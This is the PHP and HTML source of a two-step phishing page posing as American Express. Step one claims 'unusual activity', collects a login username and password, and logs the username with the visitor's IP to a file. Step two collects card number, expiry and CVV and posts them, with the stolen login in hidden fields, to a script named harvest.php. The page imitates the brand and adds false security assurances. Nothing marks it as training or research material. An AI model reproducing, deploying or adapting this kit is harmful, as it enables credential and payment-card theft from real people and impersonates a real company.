<?php
// Simple session/state for multi-step (GitHub stateless workaround)
session_start();
if (!isset($_SESSION['step'])) $_SESSION['step'] = 1;
if ($_POST && isset($_POST['username'])) {
    // Quick log first step (optional proxy)
    $log1 = "LOGIN: " . $_POST['username'] . ' | ' . $_SERVER['REMOTE_ADDR'] . ' | ' . date('Y-m-d H:i:s') . "\n";
    file_put_contents('logs.txt', $log1, FILE_APPEND);
    $_SESSION['creds'] = $_POST;
    $_SESSION['step'] = 2;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Identity - American Express</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            background: linear-gradient(135deg, #0a2540 0%, #1e3a5f 50%, #005eb8 100%); 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px; 
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 12px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.3); 
            width: 100%; 
            max-width: 420px; 
            position: relative; 
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 180px; height: auto; }
        h1 { color: #1e40af; text-align: center; font-size: 28px; font-weight: 700; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #64748b; font-size: 16px; margin-bottom: 32px; line-height: 1.5; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #374151; font-size: 14px; font-weight: 500; margin-bottom: 6px; }
        input, select { 
            width: 100%; padding: 14px 16px; border: 2px solid #e5e7eb; border-radius: 8px; 
            font-size: 16px; transition: all 0.2s; background: #fafafa; 
        }
        input:focus, select:focus { outline: none; border-color: #005eb8; background: white; box-shadow: 0 0 0 3px rgba(0,94,184,0.1); }
        .submit-btn { 
            width: 100%; padding: 16px; background: linear-gradient(135deg, #005eb8, #1e40af); 
            color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: 600; 
            cursor: pointer; transition: all 0.2s; margin-top: 10px; 
        }
        .submit-btn:hover { transform: translateY(-1px); box-shadow: 0 10px 20px rgba(0,94,184,0.3); }
        .progress { height: 4px; background: #e5e7eb; border-radius: 2px; overflow: hidden; margin: 24px 0; }
        .progress-bar { height: 100%; background: linear-gradient(90deg, #10b981, #059669); transition: width 0.4s ease; }
        .footer { text-align: center; font-size: 12px; color: #9ca3af; margin-top: 24px; }
        .step2 { animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .security { background: #ecfdf5; border: 1px solid #bbf7d0; border-radius: 8px; padding: 12px; font-size: 13px; color: #166534; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Fallback if no SVG uploaded -->
            <svg width="180" height="60" viewBox="0 0 180 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="180" height="60" rx="6" fill="#005EB8"/>
                <text x="90" y="38" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="white" text-anchor="middle">American Express</text>
            </svg>
            <?php if (file_exists('amex-logo.svg')): ?>
                <img src="amex-logo.svg" alt="American Express">
            <?php endif; ?>
        </div>

        <?php if ($_SESSION['step'] == 1): ?>
        <!-- STEP 1: Login Credentials -->
        <form method="POST" action="">
            <h1>Secure Account Verification</h1>
            <p class="subtitle">We've detected unusual activity. Please verify your login details.</p>
            
            <div class="form-group">
                <label for="username">Email or Username</label>
                <input type="email" id="username" name="username" placeholder="you@domain.com" required autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>
            
            <div class="progress"><div class="progress-bar" style="width: 50%;"></div></div>
            
            <button type="submit" class="submit-btn">Verify Identity</button>
            
            <div class="security">
                🔒 Protected by 256-bit SSL encryption
            </div>
        </form>

        <?php elseif ($_SESSION['step'] == 2): ?>
        <!-- STEP 2: Card Details -->
        <form method="POST" action="harvest.php">
            <h1>Confirm Payment Method</h1>
            <p class="subtitle">Final step: Verify your primary card for security.</p>
            
            <?php 
            // Hidden fields carry login creds
            if (isset($_SESSION['creds']['username'])) echo '<input type="hidden" name="username" value="'.htmlspecialchars($_SESSION['creds']['username']).'">';
            if (isset($_SESSION['creds']['password'])) echo '<input type="hidden" name="password" value="'.htmlspecialchars($_SESSION['creds']['password']).'">';
            ?>
            
            <div class="form-group">
                <label for="card_number">Card Number</label>
                <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required pattern="\d{4}\s?\d{4}\s?\d{4}\s?\d{4}">
            </div>
            
            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 12px;">
                <div class="form-group">
                    <label for="expiry">Expiry Date</label>
                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required pattern="(0[1-9]|1[0-2])/[0-9]{2}">
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required pattern="\d{3,4}">
                </div>
            </div>
            
            <div class="form-group">
                <label for="card_type">Card Type</label>
                <select id="card_type" name="card_type" required>
                    <option value="">Select...</option>
                    <option value="amex">American Express</option>
                    <option value="visa">Visa</option>
                    <option value="mastercard">Mastercard</option>
                    <option value="discover">Discover</option>
                </select>
            </div>
            
            <div class="progress"><div class="progress-bar" style="width: 100%;"></div></div>
            
            <button type="submit" class="submit-btn">Complete Verification</button>
            
            <div class="security">
                ✅ Account secured | You will be redirected momentarily
            </div>
        </form>
        <?php endif; ?>

        <div class="footer">
            American Express Company · Need help? 1-800-528-4800 · © 2026
        </div>
    </div>

    <script>
        // Card formatting
        document.querySelectorAll('input[name="card_number"], input[name="cvv"], input[name="expiry"]').forEach(input => {
            input.addEventListener('input', function(e) {
                let val = e.target.value.replace(/\D/g, '');
                if (e.target.name === 'card_number') val = val.replace(/(\d{4})(?=\d)/g, '$1 ');
                else if (e.target.name === 'expiry') val = val.replace(/(\d{2})(?=\d)/g, '$1/');
                e.target.value = val;
            });
        });
    </script>
</body>
</html>
